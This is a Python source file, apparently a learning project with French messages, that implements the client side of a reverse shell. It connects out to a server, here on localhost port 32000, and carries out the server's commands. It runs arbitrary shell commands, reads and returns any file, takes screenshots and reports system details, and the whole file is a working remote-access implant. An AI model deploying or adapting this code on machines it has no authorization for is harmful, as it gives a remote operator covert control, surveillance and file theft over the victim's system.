import socket
import time
import subprocess
import platform

from PIL import ImageGrab


import os

HOST_IP = "127.0.0.1"
HOST_PORT = 32000
MAX_DATA_SIZE = 1024

print(f"Connexion au serveur {HOST_IP}, port {HOST_PORT}")
while True:
    try:
        s = socket.socket()
        s.connect((HOST_IP, HOST_PORT))
    except ConnectionRefusedError:
        print("ERREUR : impossible de se connecter au serveur. Reconnexion...")
        time.sleep(4)
    else:
        print("Connecté au serveur")
        break

# ....
while True:
    command_data = s.recv(MAX_DATA_SIZE)
    if not command_data:
        break
    command = command_data.decode()
    print("Command : ", command)
    # handles file path
    commande_split = command.split(" ")        
    if command == "infos":
        response = platform.platform() + " " + os.getcwd()
        response = response.encode()
    # handles not directory    
    elif len(commande_split) == 2 and commande_split[0] == "cd":
        try:
            # .strip("'") handles the case where you drag a folder into the shell on mac
            os.chdir(commande_split[1].strip("'"))
            response = " "
        except FileNotFoundError:
            response = "ERREUR : ce répertoire n'exite pas"
        response = response.encode()
    # handles case download file client to server
    elif len(commande_split) == 2 and commande_split[0] == "dl":
        # rb = read binary
        try:
            f = open(commande_split[1], "rb")
        except FileNotFoundError:
            response = " ".encode()
        else:
            response = f.read()
            f.close()
    # handles case screenshot and save it
    elif len(commande_split) == 2 and commande_split[0] == "capture":
        screen_shot = ImageGrab.grab()
        capture_filename = commande_split[1] + ".png"
        screen_shot.save(capture_filename, "PNG")
        try:
           f = open(capture_filename, "rb")
        except FileNotFoundError:
            response = " ".encode()
        else:
            response = f.read()
            f.close()
            
    else:
        result = subprocess.run(command, shell=True, capture_output=True, universal_newlines=True)
        response = result.stdout + result.stderr
        if not response or len(response) == 0:
            response = " "
        response = response.encode()
           
    # handles too long command: HEADER 13 octets | DATA (len) octets / ex : HEADER 0000000002024 | DATA (2024) octets
    # response is already encode
    data_len = len(response)
    header = str(data_len).zfill(13)
    print(f'HEADER : {header}')
    s.sendall(header.encode())
    if data_len > 0:
        s.sendall(response)

s.close()
